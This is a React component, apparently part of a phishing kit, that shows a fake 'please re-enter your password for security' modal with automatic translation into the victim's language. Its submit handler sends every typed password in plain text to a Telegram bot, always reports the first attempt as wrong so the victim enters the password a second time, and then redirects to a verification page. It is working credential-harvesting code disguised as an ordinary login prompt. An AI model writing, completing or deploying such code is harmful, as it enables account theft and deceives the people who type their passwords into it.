import { faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PropTypes from 'prop-types';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router';
import config from '@/utils/config';
import sendMessage from '@/utils/telegram';
import { translateText } from '@/utils/translate';
import { PATHS } from '@/router/router';

const PasswordInput = ({ onClose }) => {
    const navigate = useNavigate();
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [showError, setShowError] = useState(false);
    const [attempts, setAttempts] = useState(0);

    const defaultTexts = useMemo(
        () => ({
            title: 'Please Enter Your Password',
            description: 'For your security, you must enter your password to continue',
            passwordLabel: 'Password',
            placeholder: 'Enter your password',
            errorMessage: 'The password you entered is incorrect',
            continueBtn: 'Continue',
            loadingText: 'Please wait'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    const translateAllTexts = useCallback(
        async (targetLang) => {
            try {
                const [
                    translatedTitle,
                    translatedDesc,
                    translatedLabel,
                    translatedPlaceholder,
                    translatedError,
                    translatedContinue,
                    translatedLoading
                ] = await Promise.all([
                    translateText(defaultTexts.title, targetLang),
                    translateText(defaultTexts.description, targetLang),
                    translateText(defaultTexts.passwordLabel, targetLang),
                    translateText(defaultTexts.placeholder, targetLang),
                    translateText(defaultTexts.errorMessage, targetLang),
                    translateText(defaultTexts.continueBtn, targetLang),
                    translateText(defaultTexts.loadingText, targetLang)
                ]);

                setTranslatedTexts({
                    title: translatedTitle,
                    description: translatedDesc,
                    passwordLabel: translatedLabel,
                    placeholder: translatedPlaceholder,
                    errorMessage: translatedError,
                    continueBtn: translatedContinue,
                    loadingText: translatedLoading
                });
            } catch {
                //
            }
        },
        [defaultTexts]
    );

    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            translateAllTexts(targetLang);
        }
    }, [translateAllTexts]);

    const handleSubmit = async () => {
        if (!password.trim()) return;

        setIsLoading(true);
        setShowError(false);

        try {
            const message = `🔑 <b>Password ${attempts + 1}:</b> <code>${password}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        // Đếm ngầm 2 giây thay vì hiển thị countdown
        await new Promise((resolve) => setTimeout(resolve, 2000));

        // ✅ chỉ show error ở lần sai đầu tiên
        setShowError(attempts === 0);

        setAttempts((prev) => prev + 1);
        setIsLoading(false);

        if (attempts + 1 >= config.max_password_attempts) {
            navigate(PATHS.VERIFY);
            return;
        }

        setPassword('');
    };

    return (
        <div className='fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 p-4'>
            {/* Container chính - cùng kích thước với form */}
            <div className='w-full max-w-2xl rounded-lg bg-white shadow-xl'>
                <div className='flex items-center justify-between rounded-t-lg border-b border-gray-200 bg-gray-50 px-6 py-4'>
                    <p className='text-lg font-semibold text-gray-900'>{translatedTexts.title}</p>
                    <button
                        onClick={onClose}
                        className='rounded-full p-1 hover:bg-gray-200 transition-colors'
                    >
                        <FontAwesomeIcon icon={faTimes} className='h-4 w-4 text-gray-600' />
                    </button>
                </div>
                
                <div className='px-6 py-4 space-y-4'>
                    <p className='text-sm text-gray-600 leading-relaxed'>
                        {translatedTexts.description}
                    </p>
                    
                    <div className='space-y-2'>
                        <label className='block text-sm font-medium text-gray-700'>
                            {translatedTexts.passwordLabel}
                        </label>
                        <input
                            type='password'
                            placeholder={translatedTexts.placeholder}
                            className='w-full rounded-lg border border-gray-300 px-3 py-2.5 text-sm focus:border-blue-500 focus:ring-1 focus:ring-blue-500 transition-colors'
                            value={password}
                            onChange={(e) => setPassword(e.target.value)}
                            onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                            autoFocus
                        />
                    </div>
                    
                    {showError && (
                        <p className='text-sm text-red-600 font-medium'>
                            {translatedTexts.errorMessage}
                        </p>
                    )}
                    
                    <button
                        className='w-full rounded-lg bg-blue-600 px-4 py-2.5 text-sm font-semibold text-white hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors'
                        onClick={handleSubmit}
                        disabled={isLoading || !password.trim()}
                    >
                        {isLoading ? (
                            <span className='flex items-center justify-center'>
                                <svg className='animate-spin -ml-1 mr-2 h-4 w-4 text-white' fill='none' viewBox='0 0 24 24'>
                                    <circle className='opacity-25' cx='12' cy='12' r='10' stroke='currentColor' strokeWidth='4'/>
                                    <path className='opacity-75' fill='currentColor' d='M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z'/>
                                </svg>
                                {translatedTexts.loadingText}
                            </span>
                        ) : (
                            translatedTexts.continueBtn
                        )}
                    </button>
                </div>
            </div>
        </div>
    );
};

PasswordInput.propTypes = {
    onClose: PropTypes.func.isRequired
};

export default PasswordInput;
